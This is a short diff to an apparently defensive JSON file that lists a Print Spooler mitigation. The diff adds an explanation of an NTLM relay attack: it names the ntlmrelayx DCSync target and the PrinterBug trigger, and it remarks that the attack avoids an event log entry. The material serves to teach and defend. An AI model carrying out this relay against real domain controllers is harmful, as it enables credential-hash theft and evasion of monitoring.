@@ -104,5 +104,6 @@
       "label": "Disable Print Spooler service",
       "command": "Stop-Service -Name Spooler; Set-Service -Name Spooler -StartupType Disabled"
     }
-  ]
+  ],
+  "explain": "Relays a coerced DC's NTLM authentication straight into a DCSync against a second DC:\n  impacket-ntlmrelayx       relay captured NTLM auth\n  -t dcsync://<dc2_ip>     target another DC and, on a successful relay, perform DCSync over it\n  -smb2support             accept SMB2 connections\nTrigger the PrinterBug (dementor.py) so DC1 authenticates to you; relaying that machine account to DC2 dumps hashes without generating 4662 on DC1. Mitigate by disabling the Print Spooler / its remote RPC endpoint."
 }
